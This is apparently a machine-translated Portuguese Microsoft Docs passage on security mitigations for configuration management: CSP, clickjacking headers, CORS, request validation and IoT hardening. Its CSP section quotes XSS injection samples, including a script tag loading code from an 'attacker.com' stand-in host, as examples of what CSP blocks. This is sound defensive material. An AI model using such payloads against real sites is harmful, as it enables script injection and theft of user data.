---
title: "Azure de gestão - ferramenta de modelação de ameaça Microsoft - configuração | Microsoft Docs"
description: "Mitigações ameaças exposta na ferramenta de modelação de ameaça"
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 114666d0c173786373e3bdd025027eb217922749
ms.sourcegitcommit: 6699c77dcbd5f8a1a2f21fba3d0a0005ac9ed6b7
ms.translationtype: MT
ms.contentlocale: pt-PT
ms.lasthandoff: 10/11/2017
---
# <a name="security-frame-configuration-management--mitigations"></a>Segurança moldura: Gestão de configuração | Mitigações 
| Produtos/serviços | Artigo |
| --------------- | ------- |
| **Aplicação Web** | <ul><li>[Implementar a política de segurança conteúdo (CSP) e desativar o inline javascript](#csp-js)</li><li>[Ativar o Filtro XSS do browser](#xss-filter)</li><li>[Aplicações do ASP.NET tem de desativar o rastreio e depuração antes da implementação](#trace-deploy)</li><li>[Acesso por terceiros javascripts de fontes fidedignas apenas](#js-trusted)</li><li>[Certifique-se de que as páginas ASP.NET autenticadas incorporar IU Redressing ou defesas jacking-clique em](#ui-defenses)</li><li>[Certifique-se de que apenas fidedignas origens são permitidas se CORS estiver ativada em aplicações Web ASP.NET](#cors-aspnet)</li><li>[Ativar o atributo ValidateRequest nas páginas de ASP.NET](#validate-aspnet)</li><li>[Utilizar alojado localmente versões mais recentes das bibliotecas de JavaScript](#local-js)</li><li>[Desativar interceção de MIME automática](#mime-sniff)</li><li>[Remover os cabeçalhos de servidor padrão no Windows Azure Web Sites, para evitar fingerprinting](#standard-finger)</li></ul> |
| **Base de Dados** | <ul><li>[Configurar uma Firewall do Windows para acesso ao motor de base de dados](#firewall-db)</li></ul> |
| **API Web** | <ul><li>[Certifique-se de que apenas fidedignas origens são permitidas se estiver ativada CORS na API Web do ASP.NET](#cors-api)</li><li>[Encriptar secções do Web API ficheiros de configuração que contêm dados confidenciais](#config-sensitive)</li></ul> |
| **Dispositivo IoT** | <ul><li>[Certifique-se de que todas as interfaces de administração estão protegidas com credenciais seguras](#admin-strong)</li><li>[Certifique-se de que o código desconhecido não é possível executar em dispositivos](#unknown-exe)</li><li>[Encriptar o SO e partições adicionais do dispositivo IoT com cacifo de bits](#partition-iot)</li><li>[Certifique-se de que apenas mínimo serviços/das funcionalidades estão ativadas nos dispositivos](#min-enable)</li></ul> |
| **Gateway de campo de IoT** | <ul><li>[Encriptar o SO e partições adicionais do Gateway de campo de IoT com cacifo de bits](#field-bit-locker)</li><li>[Certifique-se de que as credenciais de início de sessão predefinidas do gateway de campo são alteradas durante a instalação](#default-change)</li></ul> |
| **Gateway de nuvem do IoT** | <ul><li>[Certifique-se de que o Gateway de nuvem implementa um processo para manter o firmware de dispositivos ligados atualizados](#cloud-firmware)</li></ul> |
| **Limite de fidedignidade de máquina** | <ul><li>[Certifique-se de que os dispositivos têm de controlos de segurança do ponto final configurados de acordo com as políticas de organizacionais](#controls-policies)</li></ul> |
| **Armazenamento do Azure** | <ul><li>[Certifique-se seguro gestão das chaves de acesso de armazenamento do Azure](#secure-keys)</li><li>[Certifique-se de que apenas fidedignas origens são permitidas se CORS ativada no armazenamento do Azure](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Ativar o serviço de WCF funcionalidade de limitação](#throttling)</li><li>[Divulgação de informações de WCF através de metadados](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementar a política de segurança conteúdo (CSP) e desativar o inline javascript

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Uma introdução à política de segurança do conteúdo](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [referência de política de segurança do conteúdo](http://content-security-policy.com/), [funcionalidades de segurança](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [introdução à política de segurança conteúdo](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [posso utilizar o CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Passos** | <p>Política de segurança conteúdo (CSP) é uma segurança de defesa em profundidade mecanismo, um W3C padrão, que permite que os proprietários da aplicação web ter controlo sobre o conteúdo incorporado no respetivo site. É adicionado como um cabeçalho de resposta HTTP no servidor web e do lado do cliente, é imposta por browsers CSP. É uma política com base na lista branca - um Web site pode declarar um conjunto de domínios fidedignos partir do qual conteúdo do Active Directory, tais como JavaScript pode ser carregado.</p><p>CSP fornece as seguintes vantagens de segurança:</p><ul><li>**Proteção contra XSS:** se uma página é vulnerável a XSS, um atacante pode explorar-2 formas:<ul><li>Inserir `<script>malicious code</script>`. Este exploração não irá funcionar devido à Base do CSP restrição-1</li><li>Inserir `<script src=”http://attacker.com/maliciousCode.js”/>`. Este exploração não irá funcionar uma vez que o domínio do atacante controlada não estarão disponíveis na lista branca do CSP de domínios</li></ul></li><li>**Controlo sobre dados exfiltration:** se tenta qualquer conteúdo malicioso numa página Web ligar a um Web site externo e roubo de dados, a ligação será abortada pelo CSP. Isto acontece porque o domínio de destino não estarão disponíveis na lista branca do CSP</li><li>**Defesa contra clique-jacking:** clique-jacking é uma técnica de ataque com que um adversário pode moldura genuíno Web site e force os utilizadores a clicar em elementos de IU. Atualmente defesa contra clique-jacking é feita ao configurar um cabeçalho-X-Frame-opções de resposta. Nem todos os browsers respeitem este cabeçalho e vai CSP reencaminhar deixará de ser uma forma de padrão para se Defender contra jacking-clique em</li><li>**Relatório de ataque em tempo real:** se houver um ataque de injeção de um Web site ativada de CSP, os browsers aciona automaticamente uma notificação para um ponto final configurado no servidor de Web. Desta forma, o CSP serve como um sistema de aviso em tempo real.</li></ul> |

### <a name="example"></a>Exemplo
Política de exemplo: 
```C#
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Esta política permite que os scripts a carregar apenas a partir do servidor da aplicação web e o servidor de análise de google. Scripts carregados a partir de outro site serão rejeitadas. Quando o CSP está ativado num Web site, as seguintes funcionalidades automaticamente estão desativadas para mitigar ataques XSS. 

### <a name="example"></a>Exemplo
Inline scripts não serão executado. Seguem-se exemplos de inline scripts 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Exemplo
As cadeias não serão avaliadas como código. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Ativar o Filtro XSS do browser

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Filtro de proteção XSS](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Passos** | <p>Configuração de cabeçalho de resposta de proteção de XSS X controla o filtro de script de site entre o browser. Este cabeçalho de resposta pode ter os seguintes valores:</p><ul><li>`0:`Este procedimento desativará o filtro</li><li>`1: Filter enabled`Se for detetado um ataque de script entre sites, para parar o ataque, o browser irá limpar a página</li><li>`1: mode=block : Filter enabled`. Em vez de limpar a página, quando é detetado um ataque XSS, o browser irá impedir que a composição da página</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. O browser irá limpar a página e reportar a violação.</li></ul><p>Esta é uma função de Chromium utilizar relatórios de violação de CSP para enviar detalhes para um URI à sua escolha. As 2 últimas opções são consideradas seguros valores.</p>|

## <a id="trace-deploy"></a>Aplicações do ASP.NET tem de desativar o rastreio e depuração antes da implementação

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Descrição geral de depuração de ASP.NET](http://msdn2.microsoft.com/library/ms227556.aspx), [descrição geral do rastreio de ASP.NET](http://msdn2.microsoft.com/library/bb386420.aspx), [como: Ativar o rastreio para uma aplicação ASP.NET](http://msdn2.microsoft.com/library/0x5wc973.aspx), [como: Ativar a depuração para aplicações ASP.NET](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Passos** | Quando o rastreio está ativado para a página, cada browser pedir que também obtém as informações de rastreio que contém dados sobre o estado interno do servidor e o fluxo de trabalho. Essas informações pode ser segurança confidencial. Quando a depuração está ativada para a página, erros ocorrer no servidor de resultam em dados de rastreio de pilha completa apresentados no browser. Que dados podem expor as informações de segurança importantes sobre o fluxo de trabalho do servidor. |

## <a id="js-trusted"></a>Acesso por terceiros javascripts de fontes fidedignas apenas

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | deve ser referenciada terceiros JavaScripts apenas a partir de origens fidedignas. Os pontos finais de referência devem ser sempre em SSL. |

## <a id="ui-defenses"></a>Certifique-se de que as páginas ASP.NET autenticadas incorporar IU Redressing ou defesas jacking-clique em

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [OWASP jacking clique defesa Cheat folha](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [características de i/e - Combating jacking de clique com o X-Frame-opções](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
| **Passos** | <p>Clique jacking, também conhecido como um "IU redress ataque", é quando um atacante utiliza várias camadas transparentes ou opaco enganar um utilizador para quando clica num botão ou associar outra página quando foram pretender clique na página de nível superior.</p><p>Esta disposição em camadas é conseguida através de uma página maliciosa com um iframe que carrega a página da vítima de composição. Assim, o atacante é "assumir" cliques destinam-se os seus página e encaminhamento-los para outra página, provavelmente pertence a outra aplicação, domínio ou ambos. Para impedir ataques jacking de clique, defina os cabeçalhos de resposta de HTTP X-Frame-opções adequados que instrui o browser para não permitir que os pacotes de outros domínios</p>|

### <a name="example"></a>Exemplo
O cabeçalho X-FRAME-opções pode ser definido através de Web. config IIS. Fragmento de código Web. config para sites que nunca deve ser framed: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Exemplo
Código de Web. config para sites que só deve ser framed por páginas no mesmo domínio: 
```C#
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Certifique-se de que apenas fidedignas origens são permitidas se CORS estiver ativada em aplicações Web ASP.NET

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Formulários Web, MVC5 |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | <p>Segurança do browser impede que uma página web efetuar pedidos de AJAX para outro domínio. Esta restrição denomina-se a política da mesma origem e impede que um site malicioso ler dados confidenciais a partir de outro site. No entanto, por vezes, poderá ser necessário para expor os APIs de forma segura que outros sites podem consumir. Cruzada origem Resource Sharing (CORS) é uma norma de W3C que permite que o servidor reduzir a política da mesma origem. Utilizando a CORS, um servidor pode permitir explicitamente o alguns pedidos de origem ao rejeitar outras pessoas.</p><p>CORS é mais segura e mais flexível do que anteriormente técnicas, como JSONP. O núcleo, ativar o CORS traduz a adição de cabeçalhos de resposta HTTP uns (acesso - Control-*) para o web a aplicação e isto podem ser feitos de algumas formas.</p>|

### <a name="example"></a>Exemplo
Se o acesso à Web. config estiver disponível, CORS pode ser adicionada através de código seguinte: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Exemplo
Se o acesso à Web. config não estiver disponível, CORS podem ser configurados, adicionando o seguinte código CSharp: 
```C#
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Tenha em atenção que é fundamental para se certificar de que a lista de origens do atributo de "Acesso-controlo-permitir-origem" está definida para um conjunto de confiança e finito de origens. Falha ao configurar este inadequada (por exemplo, definindo o valor como ' *') irá permitir que os sites maliciosos acionar pedidos de origem cruzada à aplicação web > sem restrições, deste modo, tornar a aplicação vulnerável a ataques CSRF. 

## <a id="validate-aspnet"></a>Ativar o atributo ValidateRequest nas páginas de ASP.NET

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Formulários Web, MVC5 |
| **Atributos**              | N/D  |
| **Referências**              | [Pedido de validação - impedir ataques de Script](http://www.asp.net/whitepapers/request-validation) |
| **Passos** | <p>Pedido de validação, uma funcionalidade do ASP.NET desde a versão 1.1, impede que o servidor aceitar conteúdo HTML não codificado contentora. Esta funcionalidade foi concebida para ajudar a impedir a alguns ataques de injeção de script em código de script de cliente ou HTML pode ser inadvertidamente submetida para um servidor, armazenado e, em seguida, apresentado a outros utilizadores. Recomendamos vivamente ainda que validar dados de entrada de todos os e HTML codificá-lo quando for adequado.</p><p>Pedido de validação é efetuada através da comparação todos os dados de entrada para uma lista de valores potencialmente perigosos. Se ocorrer uma correspondência, o ASP.NET desencadeia um `HttpRequestValidationException`. Por predefinição, a funcionalidade de validação do pedido está ativada.</p>|

### <a name="example"></a>Exemplo
No entanto, esta funcionalidade pode ser desativada ao nível de página: 
```XML
<%@ Page validateRequest="false" %> 
```
em alternativa, ao nível da aplicação 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Tenha em atenção de que essa funcionalidade de validação do pedido não é suportada e não faz parte do pipeline de MVC6. 

## <a id="local-js"></a>Utilizar alojado localmente versões mais recentes das bibliotecas de JavaScript

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | <p>Os programadores utilizando bibliotecas de JavaScript padrão, tal como JQuery tem de utilizar aprovada as versões das bibliotecas de JavaScript comuns que não contêm falhas de segurança conhecidos. É uma boa prática utilizar a versão mais mais recente das bibliotecas, uma vez que contêm as correções de segurança de vulnerabilidades conhecidas na respetiva versões mais antigas.</p><p>Se a versão mais recente não pode ser utilizada por motivos de compatibilidade, o abaixo versões mínimas deve ser utilizada.</p><p>Aceitáveis versões mínimas:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery validar 1.9</li><li>JQuery Mobile 1.0.1</li><li>Ciclo de JQuery 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Toolkit de controlo do AJAX**<ul><li>Toolkit de controlo de AJAX 40412</li></ul></li><li>**Formulários ASP.NET Web e Ajax**<ul><li>Formulários ASP.NET Web e Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nunca carregar nenhuma biblioteca de JavaScript de sites externos, como CDNs públicos</p>|

## <a id="mime-sniff"></a>Desativar interceção de MIME automática

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [IE8 segurança parte v: proteção completa](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [tipo de MIME](http://en.wikipedia.org/wiki/Mime_type) |
| **Passos** | O cabeçalho X-conteúdo--opções do tipo é um cabeçalho de HTTP que permite aos programadores especificar que o conteúdo não deve ser intercetados na MIME. Este cabeçalho foi concebido para mitigar ataques de Interceção de MIME. Para cada página que possam conter conteúdo controllable do utilizador, tem de utilizar o X de cabeçalho de HTTP-conteúdo-tipo-nosniff: opções. Para ativar o cabeçalho necessário global para todas as páginas na aplicação, pode efetuar um dos seguintes|

### <a name="example"></a>Exemplo
Adicione o cabeçalho no ficheiro Web. config, se a aplicação for alojada por informações de serviços Internet (IIS) 7 e superior. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Exemplo
Adicionar cabeçalho através da aplicação global\_BeginRequest 
```C#
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Exemplo
Módulo HTTP personalizado implementar 
```C#
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Exemplo
Pode ativar o cabeçalho necessário apenas para páginas específicas, adicionando-a respostas individuais: 

```C#
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Remover os cabeçalhos de servidor padrão no Windows Azure Web Sites, para evitar fingerprinting

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Aplicação Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | EnvironmentType - Azure |
| **Referências**              | [Removendo cabeçalhos de servidor padrão em Sites Web do Microsoft Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Passos** | Cabeçalhos como servidor, X-se ligados à corrente-pela versão de AspNet X revelar informações sobre o servidor e as tecnologias subjacentes. Suprimir estes cabeçalhos, deste modo, é recomendado impedir fingerprinting a aplicação |

## <a id="firewall-db"></a>Configurar uma Firewall do Windows para acesso ao motor de base de dados

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Base de Dados | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | SQL Azure, OnPrem |
| **Atributos**              | N/d, versão do SQL Server - V12 |
| **Referências**              | [Como configurar uma firewall de base de dados SQL do Azure](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [configurar uma Firewall do Windows para acesso ao motor de base de dados](https://msdn.microsoft.com/library/ms175043) |
| **Passos** | Os sistemas de firewall ajudam a impedir o acesso não autorizado aos recursos de computador. Para aceder a uma instância do motor de base de dados do SQL Server através de uma firewall, tem de configurar a firewall no computador com o SQL Server para permitir o acesso |

## <a id="cors-api"></a>Certifique-se de que apenas fidedignas origens são permitidas se estiver ativada CORS na API Web do ASP.NET

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | MVC 5 |
| **Atributos**              | N/D  |
| **Referências**              | [Ativar pedidos de origem no ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - suporte de CORS na API 2 Web do ASP.NET](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Passos** | <p>Segurança do browser impede que uma página web efetuar pedidos de AJAX para outro domínio. Esta restrição denomina-se a política da mesma origem e impede que um site malicioso ler dados confidenciais a partir de outro site. No entanto, por vezes, poderá ser necessário para expor os APIs de forma segura que outros sites podem consumir. Cruzada origem Resource Sharing (CORS) é uma norma de W3C que permite que o servidor reduzir a política da mesma origem.</p><p>Utilizando a CORS, um servidor pode permitir explicitamente o alguns pedidos de origem ao rejeitar outras pessoas. CORS é mais segura e mais flexível do que anteriormente técnicas, como JSONP.</p>|

### <a name="example"></a>Exemplo
No App_Start/WebApiConfig.cs, adicione o seguinte código ao método WebApiConfig.Register 
```C#
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Exemplo
EnableCors atributo pode ser aplicado a métodos de ação no controlador da seguinte forma: 

```C#
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Tenha em atenção que é fundamental para se certificar de que a lista de origens do EnableCors atributo está definida para um conjunto de confiança e finito de origens. Falha ao configurar este inadequada (por exemplo, definindo o valor como ' *') irá permitir que os sites maliciosos acionar pedidos de origem cruzada para a API sem restrições, >, deste modo, tornar a API vulnerável a ataques CSRF. Pode ser decorado EnableCors ao nível do controlador. 

### <a name="example"></a>Exemplo
Para desativar a CORS num determinado método de uma classe, o atributo DisableCors pode ser utilizado como mostrado abaixo: 
```C#
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | MVC 6 |
| **Atributos**              | N/D  |
| **Referências**              | [Ativar pedidos de várias origens (CORS) em ASP.NET Core 1.0](https://docs.asp.net/en/latest/security/cors.html) |
| **Passos** | <p>Na versão 1.0 do núcleo de ASP.NET, CORS podem ser ativadas utilizando o middleware ou utilizar MVC. Quando utiliza o MVC para ativar o CORS os serviços CORS mesmos são utilizados, mas não é o middleware CORS.</p>|

**Abordagem 1** ativar o CORS com middleware: para ativar o CORS para a aplicação completa adicionar o middleware CORS no pipeline de pedido utilizando o método de extensão UseCors. Uma política de várias origens pode ser especificada ao adicionar o middleware CORS utilizando a classe de CorsPolicyBuilder. Existem duas formas para efetuar este procedimento:

### <a name="example"></a>Exemplo
O primeiro é chamada UseCors com um lambda. O lambda demora um objeto de CorsPolicyBuilder: 
```C#
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Exemplo
O segundo consiste em definir uma ou mais políticas CORS com nome e, em seguida, selecione a política de por nome em tempo de execução. 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Abordagem 2** ativar a CORS no MVC: os programadores podem em alternativa utilizar MVC para aplicar a CORS específico por ação, por controlador ou global de todos os controladores.

### <a name="example"></a>Exemplo
Por ação: para especificar um CORS política para uma ação específica adicionar o atributo [EnableCors] para a ação. Especifique o nome da política. 
```C#
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Exemplo
Por controlador: 
```C#
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Exemplo
Global: 
```C#
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Tenha em atenção que é fundamental para se certificar de que a lista de origens do EnableCors atributo está definida para um conjunto de confiança e finito de origens. Falha ao configurar este inadequada (por exemplo, definindo o valor como ' *') irá permitir que os sites maliciosos acionar pedidos de origem cruzada para a API sem restrições, >, deste modo, tornar a API vulnerável a ataques CSRF. 

### <a name="example"></a>Exemplo
Para desativar o CORS para um controlador ou ação, utilize o atributo [DisableCors]. 
```C#
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Encriptar secções do Web API ficheiros de configuração que contêm dados confidenciais

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | API Web | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Como: Encriptar secções de configuração no ASP.NET 2.0 utilizando DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [especificar um fornecedor de configuração protegidos](https://msdn.microsoft.com/library/68ze1hb2.aspx), [utilizando o Cofre de chaves do Azure para proteger os segredos de aplicação](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Passos** | Ficheiros de configuração, tais como o Web. config, appsettings.json são frequentemente utilizados para conter informações confidenciais, incluindo os nomes de utilizador, palavras-passe, as cadeias de ligação de base de dados e chaves de encriptação. Se não proteger estas informações, a aplicação é vulnerável a atacantes ou obtenção de informações confidenciais, tais como nomes de contas de utilizador e palavras-passe, os nomes de base de dados e os nomes dos servidores que utilizadores mal intencionados. Consoante o tipo de implementação (azure/no local), encriptar as secções confidenciais dos ficheiros de configuração utilizando a DPAPI ou serviços como o Cofre de chaves do Azure. |

## <a id="admin-strong"></a>Certifique-se de que todas as interfaces de administração estão protegidas com credenciais seguras

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | Qualquer interface administrativa que expõe o gateway do dispositivo ou o campo deve ser protegido utilizando credenciais seguras. Além disso, quaisquer outras interfaces expostas como Wi-Fi, SSH, as partilhas de ficheiros, o FTP deve ser protegida com credenciais seguras. Palavras-passe fracas predefinidas não devem ser utilizadas. |

## <a id="unknown-exe"></a>Certifique-se de que o código desconhecido não é possível executar em dispositivos

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | [Ativar o arranque seguro e a encriptação de dispositivos do cacifo de bits no Windows 10 IoT Core](https://developer.microsoft.com/windows/iot/win10/sb_bl) |
| **Passos** | Arranque seguro de UEFI restringe o sistema para permitir apenas a execução de binários assinado por uma autoridade especificada. Esta funcionalidade impede código desconhecido que está a ser executado na plataforma e potencialmente weakening a postura de segurança do mesmo. Ative o arranque seguro de UEFI e restringir a lista de autoridades de certificação que são fidedignas para a assinatura de código. Inicie sessão todo o código que é implementado no dispositivo com uma das autoridades de fidedignas. |

## <a id="partition-iot"></a>Encriptar o SO e partições adicionais do dispositivo IoT com cacifo de bits

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Compilação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | Windows 10 IoT Core implementa uma versão simples da encriptação de dispositivo do cacifo de bits, que tem uma dependência forte na presença de um TPM na plataforma, incluindo o protocolo necessário preOS em UEFI que efetua os valores necessários. Estas medidas preOS Certifique-se de que o SO posterior tem um registo definitiva de como o sistema operativo foi iniciado. Encriptar as partições de SO utilizando também cacifo de bits e quaisquer partições adicionais caso armazenam dados confidenciais. |

## <a id="min-enable"></a>Certifique-se de que apenas mínimo serviços/das funcionalidades estão ativadas nos dispositivos

| Título                   | Detalhes      |
| ----------------------- | ------------ |
| **Componente**               | Dispositivo IoT | 
| **Fase SDL**               | Implementação |  
| **Tecnologias aplicáveis** | Genérico |
| **Atributos**              | N/D  |
| **Referências**              | N/D  |
| **Passos** | Não ativar ou desativar quaisquer funcionalidades ou serviços no sistema operativo que não é necessário para o funcionamento da solução. Para por exemplo, se o dispositivo não necessita de uma IU para ser implementado, instalar o Windows IoT Core no modo sem interface. |

## <a id="field-bit-locker"></a>Encriptar o SO e partições adicionais do Gateway de campo de IoT com cacifo de bits

| Título                   | Detalhes      |
| ----------------------- | ------------ |
